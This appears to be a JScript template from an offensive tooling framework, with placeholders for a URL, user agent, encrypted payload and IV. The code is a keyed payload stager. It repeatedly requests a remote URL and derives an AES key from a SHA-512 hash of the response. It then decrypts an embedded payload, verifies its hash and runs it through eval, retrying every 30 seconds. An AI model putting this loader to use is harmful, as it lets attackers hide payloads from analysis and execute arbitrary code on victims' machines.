var hkPayloadHash = "~HKPAYLOADHASH~";
var hkPayload = "~HKPAYLOAD~";
for(var i = 0; i < ~RETRYNUM~; i++) {
    var xHttp = new ActiveXObject("MSXML2.XMLHTTP");
    xHttp.Open("GET", "~HKURL~", false);
    xHttp.setRequestHeader("User-Agent", "~HKUSERAGENT~");
    xHttp.Send();
    response = xHttp.responseText;
    var key = getSHA512(response);
    key = key.substring(0,32);
    try {
        var decrypted = decryptAES(hkPayload, key, "~HKIV~")
        if(compareHash(decrypted, hkPayloadHash, 0)) {
            eval(decrypted);
            WScript.Quit(1);
        }
    }
    catch(err) {}
    WScript.Sleep(30000);
}
